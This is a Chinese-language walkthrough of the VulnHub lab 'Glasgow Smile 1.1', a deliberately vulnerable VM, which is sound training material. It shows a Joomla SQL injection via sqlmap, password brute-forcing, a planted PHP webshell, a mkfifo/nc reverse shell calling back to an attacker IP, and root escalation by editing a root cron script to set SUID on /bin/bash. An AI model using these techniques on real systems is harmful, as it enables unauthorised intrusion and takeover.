# Glasgow Smile: 1.1

2024-5-30 https://www.vulnhub.com/entry/glasgow-smile-11,491/

difficulty: Intermediate

## IP

192.168.10.176

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6734481f250ed7b3eabb361122608fa1 (RSA)
|   256 4c8c4565a484e8b1507777a93a960631 (ECDSA)
|_  256 09e994236097f720cceed6c19bda188e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

http://192.168.10.176/ 首页是图片，其他什么都没有，图片上也没有隐写信息。

gobuster 扫描一下：

```
gobuster -t 64 dir -u http://192.168.10.176/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.10.176/joomla               (Status: 301) [Size: 317] [--> http://192.168.10.176/joomla/]
http://192.168.10.176/how_to.txt           (Status: 200) [Size: 456]
```

how_to.txt 先看看显示什么，可能存在一个叫 rob 的账号。

另外还有一个 joomla 的 cms，访问 http://192.168.10.176/joomla/robots.txt 得到了一些目录信息：

```
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

查看 jooma 版本 version 3.7.3-rc1：

```
http://192.168.10.176/joomla/language/en-GB/en-GB.xml
http://192.168.10.176/joomla/administrator/manifests/files/joomla.xml
```

看看这个版本的 jooma 有没有漏洞吧，经过查询，3.7 系列存在 sql 注入漏洞：

```
sqlmap -u 'http://192.168.10.176/joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

看到了一个登陆页面 http://192.168.10.176/joomla/administrator/ 登陆页面，先用前面得到的 rob 、 admin、 joomla 用户，尝试使用 rockyou 字典爆破，没有获得密码。

(这里可能想不到，joomla 的默认用户是 admin，但是 admin 爆不出，只有尝试将可能的用户都进行爆破)

在使用 cewl 收集下网页中的信息吧，也常出现密码出现在网页中的情况：

```
cewl -d 5 http://192.168.10.176/joomla/ -w pass.txt

python joomla-brute.py -u http://192.168.10.176/joomla -w pass.txt -usr joomla
```

竟然爆破出了密码，joomla:Gotham，进行登陆，可以在后台中设置反弹 shell。

在顶部菜单中，Extensions -> Templates -> Templates 选中一个主题，编辑它的 error.php 页面，加入 php 一句话木马：`system($_GET['cmd']);`，然后点击保存。

通过下面的语句测试一句话是否成功：

```
curl -s http://192.168.10.176/joomla/templates/beez3/error.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

kali 上监听 8888 端口，然后利用一句话木马执行反弹命令：

```
curl -s http://192.168.10.176/joomla/templates/beez3/error.php -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.10.3 8888 >/tmp/f'
```

得到反弹 shell：

```
www-data@glasgowsmile:/var/www/html/joomla/templates/beez3$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先升级 tty。

进行系统枚举，/etc/passwd 中发现几个用户：

```
root:x:0:0:root:/root:/bin/bash
rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash
```

sudo、suid、crontab、cap 暂时没发现什么可以利用的，估计要从上面几个用户中发现提权路径。

/home/abner 中有 flag 和 info 信息，但是没有权限读取。

/home/rob 中有 flag 和提示信息，但是目前没权限读取。

/home/penguin 中发现 SomeoneWhoHidesBehindAMask，只有 r 权限，无法 cd，只能用 ls：

```
www-data@glasgowsmile:/home/penguin$ ls -al SomeoneWhoHidesBehindAMask/
.trash_old                     PeopleAreStartingToNotice.txt  find                           user3.txt
```

发现 joomla 数据库配置文件：

```
/var/www/html/joomla/configuration.php

/var/www/joomla2/configuration.php

public $host = 'localhost';
public $user = 'joomla';
public $password = 'babyjoker';
public $db = 'joomla_db';
public $dbprefix = 'jnqcu_';
public $live_site = '';
public $secret = 'fNRyp6KO51013435';
```

尝试了 babyjoker 密码，不是 home 目录下那三个用户的，只好进入到数据库中看看有没有隐藏的表信息：

```
batjoke 库中的 taskforce 表，展示了信息。

MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |  --> baneishere
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |  --> aaronishere
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |  --> carnageishere
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |  --> busterishereff
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |  --> ???AllIHaveAreNegativeThoughts???
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |  --> auntis the fuck here
+----+---------+------------+---------+----------------------------------------------+
```

用 hydra 尝试下碰撞，看看哪个密码匹配哪个用户。

发现 rob 的密码可以登陆，ssh 进行登陆，密码为???AllIHaveAreNegativeThoughts???

得到 user flag：

```
rob@glasgowsmile:~$ cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]
```

查看 Abnerineedyourhelp 内容：

```
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
```

上面的文字看起来有点乱，像是进行了移位编码，尝试从 1-25 移位，结果发现移位 1 位就能显示出原文：

```
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
```

最后那串 base64 解码后值是 I33hope99my0death000makes44more8cents00than0my0life0 这个应该就是 abner 的密码。

su abner

得到了第 2 个 user flag：

```
abner@glasgowsmile:~$ cat user2.txt
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
```

查看 info.txt ：

```
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
```

这个 info 没什么作用。

.bash_history 中发现了一个 zip 包 .dear_penguins.zip，查找一下看看在哪里(查看 .bash_history 是必要操作)：

```
abner@glasgowsmile:~$ find / -name '.dear_penguins.zip' 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip

unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```

解压需要密码，把压缩包传输到 kali 上进行 john + rockyou 破解，但是没有找到密码。

再次使用前面得到的几个账户的密码，尝试解压，最后发现 I33hope99my0death000makes44more8cents00than0my0life0 密码可以解压(就得到了那么几个密码，只好尝试看看对不对)。

读取解压后的内容：

```
abner@glasgowsmile:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```

scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz 可能就是 penguin 的用户密码，su 切换成功。

得到 user falg 3:

```
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt
JKR{284a3753ec11a592ee34098b8cb43d52}
```

```
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt

Hey Penguin,
I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.

Joker
```

提示有一个软件的服务权限有问题，应改就是那个 find，但是 find 的用户不是 root，不能用它提权到 root，是个坑。

.trash_old 的所属用户组是 root，估计有可能是 root 调用了的计划任务在执行这个脚本,使用 pspy 进行查看，发现确实是 root 在每隔 1 分钟进行调用。

将 chmod +xs /bin/bash 添加到这个脚本中，等待一会，发现 /bin/bash 已经变成 suid：

```
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 17  2019 /bin/bash

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ /bin/bash -p
bash-5.0# id
uid=1002(penguin) gid=1002(penguin) euid=0(root) egid=0(root) groups=0(root),1002(penguin)
bash-5.0# cd /root
bash-5.0# ls
root.txt  whoami
bash-5.0# cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
```

最后找到触发这个定时任务的脚本：

```
cat /var/spool/cron/crontabs/root

* * * * * /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
```
